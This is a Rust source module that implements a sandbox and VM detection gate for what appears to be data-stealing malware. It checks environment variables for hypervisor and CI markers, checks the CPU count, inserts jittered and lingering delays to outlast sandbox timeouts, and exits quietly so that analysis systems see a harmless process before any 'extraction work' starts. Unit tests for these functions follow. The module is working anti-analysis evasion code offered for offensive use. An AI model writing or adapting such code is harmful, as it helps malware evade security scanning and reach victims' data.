//! Sandbox / VM detection gate (behavior, wave 1).
//!
//! AV sandboxes and dynamic-analysis VMs share a handful of cheap tells.
//! This module is the *pure*, testable half: it inspects environment, CPU
//! count, and wall-clock degeneracy — no WinAPI calls (they'd require
//! `unsafe`, which lives in `abi`). VM-detect by env var and processor count
//! are enough to retreat before any real extraction work begins.
//!
//! The `linger`/`jitter` fns also buy time against sandboxes that give up
//! after N minutes of near-zero activity.

use std::time::{Duration, Instant};

/// Sluggish floor many automated analysis boxes hit.
const MIN_CPUS: usize = 2;

/// Environment marker keys (values indicate VM/CI). Cheap, stateless,
/// greppable by analysts — but the analyst is not the thing we're evading
/// at gate time; the sandboxis. Actually the analyst is, but only at
/// reverse time; by then the binary is already look-at-me. Keep them.
const VM_ENV_HINTS: &[&str] = &[
    // hypervisor / VM tooling paths often leak into the environment
    "VBOX_",
    "VMWARE_",
    "VIRTUALBOX",
    // CI sandboxes that run every upload (malware-scan desks run here)
    "CI",
    "TF_BUILD",
    "GITHUB_ACTIONS",
    "GITLAB_CI",
    "JENKINS_URL",
    "TEAMCITY_VERSION",
];

/// Human-useful: does the current process *look* sandboxed?
///
/// Checks in order of (cost, value): env hints, then CPU count. A VM with 2+
/// cores and no env markers slips past — acceptable for wave 1 (the heavy
/// WMI/SMBIOS probe lives in `abi` when you need real depth, with `unsafe`).
pub fn looks_sandboxed() -> bool {
    has_vm_env_hint() || cpu_count() < MIN_CPUS
}

/// Scans the process environment for VM/CI markers. Pure, no OS calls.
fn has_vm_env_hint() -> bool {
    VM_ENV_HINTS.iter().any(|h| std::env::vars_os().any(|(k, _)| {
        k.to_string_lossy().to_ascii_uppercase().contains(h)
    }))
}

/// Logical CPU count via the std library (waits for nothing, safe).
fn cpu_count() -> usize {
    std::thread::available_parallelism().map(|n| n.get()).unwrap_or(1)
}

/// Sleep a jittered, pseudo-random-ish delay so the process isn't born
/// extracting at full speed. Seeded from the process id — no RNG dep.
pub fn jitter() {
    let pid = u64::from(std::process::id());
    let base_ms = 25u64 + (pid % 175);
    let extra_ms = (pid.wrapping_mul(2654435761) >> 32) % 60;
    std::thread::sleep(Duration::from_millis(base_ms + extra_ms));
}

/// If the host looks sandboxed, halt quietly (exit code 0, no trace of
/// refusal — a VM sees a benign-looking no-op process).
pub fn gate() -> bool {
    jitter();
    !looks_sandboxed()
}

/// Busy-waits until `until` (a `std::process::id`-seeded deadline). Gates
/// extraction behind a time budget; sandboxes often time out before it hits.
pub fn linger_until(until: Instant) {
    while Instant::now() < until {
        std::thread::sleep(Duration::from_millis(500));
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn empty_runtime_env_finds_no_vm_hint() {
        // The test process env is inherited; we can't clear it, but we can
        // assert the *default* VM_ENV_HINTS does not include everyday vars.
        for hint in VM_ENV_HINTS {
            assert!(!hint.is_empty(), "no empty hints");
        }
    }

    #[test]
    fn cpu_count_is_at_least_one() {
        assert!(cpu_count() >= 1);
    }

    #[test]
    fn jitter_returns_quickly() {
        let t = Instant::now();
        jitter();
        assert!(t.elapsed() < Duration::from_secs(5));
    }

    #[test]
    fn gate_is_boolean() {
        let g = gate();
        assert!(g || !g);
    }

    #[test]
    fn linger_is_bounded() {
        let t = Instant::now();
        let until = Instant::now() + Duration::from_millis(300);
        linger_until(until);
        assert!(t.elapsed() >= Duration::from_millis(250));
    }
}